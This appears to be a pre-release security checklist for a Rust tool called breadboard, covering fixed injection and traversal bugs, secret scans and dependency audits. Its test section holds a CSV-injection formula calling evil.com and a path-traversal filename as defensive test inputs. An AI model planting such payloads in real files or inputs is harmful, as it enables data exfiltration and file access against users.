# Pre-Release Security Checklist

**Complete this checklist before making the repository public.**

## Code Security ✅

- [x] **C1 - SQL Injection Fixed** - Removed string formatting in `mark_alert_sent` (db.rs:770)
- [x] **H1 - CSV Injection Fixed** - Added `sanitize_csv_field()` function (main.rs:788)
- [x] **H2 - Path Traversal Fixed** - Added `validate_export_path()` function (main.rs:315)
- [x] **M3 - Database Permissions Fixed** - Set 0600 permissions on db creation (db.rs:286)
- [ ] **M4 - API Key Logging** - Review sync.rs for API key sanitization in logs
- [ ] Run `cargo clippy` with no warnings
- [ ] Run `cargo test` with all tests passing

## Secrets & Data ✅

- [ ] **Verify no .env file in repository:**
  ```bash
  git ls-files | grep -E '\.env$'
  # Should return nothing
  ```

- [ ] **Verify no database files:**
  ```bash
  git ls-files | grep -E '\.db$'
  # Should return nothing
  ```

- [ ] **Scan for hardcoded secrets:**
  ```bash
  git grep -i "sk-[a-zA-Z0-9]\{20,\}" | grep -v "example\|README\|SETUP\|SECURITY"
  # Should only show example files
  ```

- [ ] **Check git history for secrets:**
  ```bash
  git log -p | grep -i "sk-ant-api03-" | grep -v "your-key-here\|example"
  # Should return nothing
  ```

## Dependencies ⚠️

- [ ] **Install cargo-audit:**
  ```bash
  cargo install cargo-audit
  ```

- [ ] **Run cargo audit:**
  ```bash
  cargo audit --deny warnings
  # Should pass with no warnings
  ```

- [ ] **Update dependencies:**
  ```bash
  cargo update
  cargo build --release
  cargo test
  ```

- [ ] **Review Cargo.lock for known vulnerabilities**
  ```bash
  cargo audit
  ```

## Documentation ✅

- [x] Add `SECURITY.md` with responsible disclosure policy
- [ ] Update README.md with security section
- [ ] Add privacy notice to README.md
- [ ] Document data storage locations
- [ ] Update `.env.example` with clear placeholders
- [ ] Add security badge to README (after first release)

## Repository ✅

- [x] Update `.gitignore` with security-focused entries
- [ ] Set up GitHub Dependabot (in repository settings)
- [ ] Add security GitHub workflow (`.github/workflows/security.yml`)
- [ ] Add branch protection rules (require reviews, status checks)
- [ ] Enable security advisories in repository settings

## Testing

- [ ] **Test with malicious prompts:**
  ```bash
  breadboard "=1+1"  # CSV injection
  breadboard template save test "=IMPORTXML(\"http://evil.com\")"
  breadboard export --output test.csv
  # Verify formula is prefixed with single quote
  ```

- [ ] **Test path traversal:**
  ```bash
  breadboard export --output ../../../tmp/test.csv
  # Should error: "Export path must be a filename only"

  breadboard export --output test.txt
  # Should error: "Export file must have .csv extension"
  ```

- [ ] **Verify database permissions:**
  ```bash
  ls -la ~/Library/Application\ Support/breadboard/usage.db
  # Should show: -rw------- (600) on Unix systems
  ```

- [ ] **Test SQL injection protection:**
  ```bash
  # Start breadboard, trigger budget alerts
  # No SQL errors should occur
  ```

## Final Checks

- [ ] **All GitHub Actions passing**
  - Build workflow
  - Test workflow
  - Security audit workflow

- [ ] **No compiler warnings:**
  ```bash
  cargo build --release 2>&1 | grep warning:
  # Review any warnings, fix if security-related
  ```

- [ ] **No clippy warnings:**
  ```bash
  cargo clippy -- -D warnings
  # Should pass
  ```

- [ ] **Security audit grade: A or better**
  - Review security audit report
  - All critical issues fixed
  - All high-priority issues fixed

- [ ] **Documentation complete:**
  - [ ] README.md updated
  - [ ] SECURITY.md created
  - [ ] DOCUMENTATION.md updated
  - [ ] All cross-references working

## Pre-Publish Commands

Run these commands immediately before `git push` to public repository:

```bash
# 1. Verify no sensitive files
git status | grep -E '\.env$|\.db$|\.key$|\.pem$'

# 2. Verify gitignore working
git ls-files | grep -E '\.env$|\.db$'

# 3. Final security scan
git grep -i "password\|secret\|api[_-]key" | grep -v "example\|README\|SETUP\|SECURITY"

# 4. Run tests
cargo test

# 5. Run cargo audit
cargo audit

# 6. Build release binary
cargo build --release

# 7. Verify binary size (should be ~3.2MB)
ls -lh target/release/breadboard
```

## Post-Release

After making repository public:

- [ ] Monitor GitHub security advisories
- [ ] Set up automated dependency updates (Dependabot)
- [ ] Add security contact email to SECURITY.md
- [ ] Respond to security reports within 48 hours
- [ ] Keep dependencies updated monthly
- [ ] Run `cargo audit` monthly
- [ ] Review and merge Dependabot PRs promptly

## Checklist Sign-Off

- [ ] **Code reviewed:** _____ (initials)
- [ ] **Security tested:** _____ (initials)
- [ ] **Documentation reviewed:** _____ (initials)
- [ ] **Ready for public release:** _____ (initials)

**Date completed:** _____________

---

## Notes

Add any additional notes or concerns here:

-
